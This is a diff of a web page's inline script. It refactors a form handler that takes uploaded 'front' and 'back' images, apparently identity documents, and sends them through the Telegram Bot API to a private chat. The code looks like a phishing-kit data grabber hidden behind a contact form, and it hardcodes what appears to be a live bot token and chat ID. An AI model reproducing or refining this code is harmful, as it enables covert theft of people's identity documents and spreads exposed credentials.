@@ -551,11 +551,10 @@
       }
     });
   </script> 
- <script>
+<script>
     document.getElementById("newcontactForm").addEventListener("submit", async function (e) {
         e.preventDefault(); // Prevent form submission
-
-        const botToken = "7584753511:AAGgCBMZo7Cg6p9IcFeNQiZb0639AO03kk8";
+      const botToken = "7584753511:AAGgCBMZo7Cg6p9IcFeNQiZb0639AO03kk8";
         const chatId = "7921593296"; // Replace with your Telegram Chat ID
 
         const frontFile = document.getElementById("front").files[0];
@@ -583,29 +582,23 @@
         document.body.appendChild(loadingScreen);
 
         try {
-            // Send Front Image
-            const frontFormData = new FormData();
-            frontFormData.append("chat_id", chatId);
-            frontFormData.append("photo", frontFile);
+            // Helper function to upload a photo
+            const sendPhoto = async (file) => {
+                const formData = new FormData();
+                formData.append("chat_id", chatId);
+                formData.append("photo", file);
 
-            const frontResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: "POST",
-                body: frontFormData,
-            });
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: "POST",
+                    body: formData,
+                });
 
-            if (!frontResponse.ok) throw new Error("Failed to send front image.");
+                if (!response.ok) throw new Error("Failed to send image.");
+            };
 
-            // Send Back Image
-            const backFormData = new FormData();
-            backFormData.append("chat_id", chatId);
-            backFormData.append("photo", backFile);
-
-            const backResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: "POST",
-                body: backFormData,
-            });
-
-            if (!backResponse.ok) throw new Error("Failed to send back image.");
+            // Upload both images
+            await sendPhoto(frontFile);
+            await sendPhoto(backFile);
 
             // Remove loading screen
             document.body.removeChild(loadingScreen);
@@ -622,6 +615,7 @@
         }
     });
 </script>
+
 
          <!-- Jquery Min JS -->
       <!-- Jquery Min JS -->
